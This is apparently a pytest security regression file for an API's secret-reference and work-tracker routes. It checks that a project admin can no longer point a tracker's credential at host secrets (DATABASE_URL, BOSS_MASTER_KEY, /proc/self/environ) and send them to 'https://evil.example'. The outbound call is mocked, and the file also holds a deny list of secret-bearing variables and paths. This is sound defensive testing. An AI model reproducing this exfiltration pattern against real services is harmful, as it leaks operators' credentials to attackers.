"""The /v1/secret-refs lead (id-sec-final2): a reference to this host's own material.

A project Admin could name ANY environment variable of the API process — `env:DATABASE_URL`,
`env:BOSS_MASTER_KEY` — in a secret reference or straight in a work tracker's configuration, and
choose the URL it is sent to: POST /v1/work-trackers/connect tests the connection at once, with the
value as the tracker's API key. `local_runner:/proc/self/environ` read every variable at once. A
configuration could also name ANOTHER project's reference id, and the resolver had no project check.

Proven here through the real routes (the outbound HTTP call is captured, never made), and refused:
an allowlist of env names (services/env_refs.py) where a value is READ and where a reference is
CREATED, a never-read list of system and identity paths, and a project check in resolve_secret_ref.
"""
from __future__ import annotations

import uuid

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import text

from apps.api.app import identity_guard
from apps.api.app import main as api_main
from apps.api.app.main import app
from apps.api.tests.identity_fixtures import IdentityWorld
from boss_engine.services import env_refs, work_tracker_adapters
from boss_engine.services.secret_backends import SecretUnavailable, resolve_secret_ref

H = {"sec-fetch-site": "same-origin"}
CANARY = "postgresql://boss:canary-not-a-real-password@db/boss"


@pytest.fixture
def world(engine, monkeypatch) -> IdentityWorld:
    w = IdentityWorld.create(engine)
    w.claimed()
    monkeypatch.setattr(api_main.settings, "require_api_auth", True)
    monkeypatch.setattr(identity_guard, "presents_identity_credential", lambda conn: True)
    w.admin = w.person("ProjectAdmin")
    w.bind(w.admin, "admin", project=w.project_a)
    return w


@pytest.fixture
def sent(monkeypatch):
    """Every outbound tracker call: (url, headers). Never made."""
    calls: list[tuple[str, dict]] = []

    def fake(method, url, *, headers, body=None, timeout=20.0):
        calls.append((url, dict(headers)))
        return {"name": "evil"}

    monkeypatch.setattr(work_tracker_adapters, "_http_json", fake)
    return calls


def _post(world, path, body):
    with world.acting_as(world.ctx(world.admin)):
        return TestClient(app, raise_server_exceptions=False).post(path, json=body, headers=H)


def _leaked(calls, value):
    return [c for c in calls if any(value in str(v) for v in c[1].values())]


@pytest.mark.parametrize("name", ["DATABASE_URL", "BOSS_MASTER_KEY", "BOSS_HOST_API_KEY", "POSTGRES_PASSWORD"])
def test_a_tracker_configuration_never_sends_a_boss_secret(world, sent, monkeypatch, name):
    monkeypatch.setenv(name, CANARY)
    r = _post(world, "/v1/work-trackers/connect", {
        "project_id": world.project_a, "provider_key": "plane", "actor": world.admin.id, "test": True,
        "configuration": {"api_base_url": "https://evil.example", "workspace_slug": "w", "project_id": "p",
                          "credential_ref": f"env:{name}"}})
    assert not _leaked(sent, CANARY), sent
    assert r.status_code == 422, r.text


def test_a_tracker_without_a_token_never_borrows_another_providers(world, sent, monkeypatch):
    monkeypatch.setenv("BOSS_GITHUB_TOKEN", "ghp_canary_org_token")
    monkeypatch.delenv("PLANE_API_KEY", raising=False)
    _post(world, "/v1/work-trackers/connect", {
        "project_id": world.project_a, "provider_key": "plane", "actor": world.admin.id, "test": True,
        "configuration": {"api_base_url": "https://evil.example", "workspace_slug": "w", "project_id": "p"}})
    assert not _leaked(sent, "ghp_canary_org_token"), sent


@pytest.mark.parametrize("kind,key", [("env", "DATABASE_URL"), ("env", "BOSS_MASTER_KEY"),
                                      ("env", "BOSS_SOME_NEW_API_KEY"),
                                      ("local_runner", "/proc/self/environ"),
                                      ("local_runner", "/var/lib/boss/identity/master.key")])
def test_a_reference_to_boss_own_material_is_refused_in_words(world, kind, key):
    r = _post(world, "/v1/secret-refs", {"project_id": world.project_a, "ref_kind": kind, "ref_key": key,
                                         "actor": world.admin.id, "status": "active", "metadata": {}})
    assert r.status_code == 422, r.text
    assert "cannot" in r.text


def _ref(world, project, kind, key, *, scope="project", scope_id=None):
    rid = f"secret_{uuid.uuid4().hex[:10]}"
    with world.engine.begin() as db:
        db.execute(text("INSERT INTO secret_refs (id, project_id, scope_type, scope_id, ref_kind, ref_key, "
                        "storage_backend, status, created_by) VALUES (:i, :p, :st, :si, :k, :rk, :b, 'active', 't')"),
                   {"i": rid, "p": project, "st": scope, "si": scope_id or project, "k": kind, "rk": key,
                    "b": "environment" if kind == "env" else kind})
    return rid


def test_a_stored_reference_to_a_boss_secret_never_resolves(world, monkeypatch):
    """A row written before this rule (or straight into the table) is refused where it is READ."""
    monkeypatch.setenv("DATABASE_URL", CANARY)
    rid = _ref(world, world.project_a, "env", "DATABASE_URL")
    with world.engine.begin() as db, pytest.raises(SecretUnavailable) as refused:
        resolve_secret_ref(db, rid, api_main.settings)
    assert CANARY not in str(refused.value)


def test_a_reference_resolves_only_for_its_own_project_or_its_org(world, monkeypatch):
    monkeypatch.setenv("BOSS_DIGITALOCEAN_TOKEN", "do_canary")
    own = _ref(world, world.project_a, "env", "BOSS_DIGITALOCEAN_TOKEN")
    shared = _ref(world, world.project_a, "env", "BOSS_CLOUDFLARE_API_TOKEN", scope="org", scope_id=world.org)
    monkeypatch.setenv("BOSS_CLOUDFLARE_API_TOKEN", "cf_canary")
    with world.engine.begin() as db:
        assert resolve_secret_ref(db, own, api_main.settings, project_id=world.project_a) == "do_canary"
        with pytest.raises(SecretUnavailable):
            resolve_secret_ref(db, own, api_main.settings, project_id=world.project_b)
        assert resolve_secret_ref(db, shared, api_main.settings, project_id=world.project_b) == "cf_canary"


def test_a_tracker_configuration_cannot_borrow_another_projects_reference(world, sent, monkeypatch):
    monkeypatch.setenv("BOSS_DIGITALOCEAN_TOKEN", "do_canary_of_project_b")
    theirs = _ref(world, world.project_b, "env", "BOSS_DIGITALOCEAN_TOKEN")
    _post(world, "/v1/work-trackers/connect", {
        "project_id": world.project_a, "provider_key": "plane", "actor": world.admin.id, "test": True,
        "configuration": {"api_base_url": "https://evil.example", "workspace_slug": "w", "project_id": "p",
                          "secret_ref_id": theirs}})
    assert not _leaked(sent, "do_canary_of_project_b"), sent


def test_the_allowlist():
    assert env_refs.env_name_allowed("OPENAI_API_KEY")
    assert env_refs.env_name_allowed("BOSS_AWS_SECRET_ACCESS_KEY")
    for name in ("DATABASE_URL", "BOSS_MASTER_KEY", "BOSS_HOST_API_KEY", "PGPASSWORD", "HOME", "PATH",
                 env_refs.ALLOW_VAR):
        assert not env_refs.env_name_allowed(name), name
    assert not env_refs.file_path_allowed("/proc/self/environ")
    assert not env_refs.file_path_allowed("/app/.env")
    assert env_refs.file_path_allowed("/home/boss/.ssh/id_ed25519")


def test_the_operator_extends_the_allowlist_but_never_past_never(monkeypatch):
    monkeypatch.setenv(env_refs.ALLOW_VAR, "ACME_TOKEN,ACME_*,DATABASE_URL,BOSS_MASTER_KEY")
    assert env_refs.env_name_allowed("ACME_TOKEN") and env_refs.env_name_allowed("ACME_OTHER")
    assert not env_refs.env_name_allowed("DATABASE_URL")
    assert not env_refs.env_name_allowed("BOSS_MASTER_KEY")
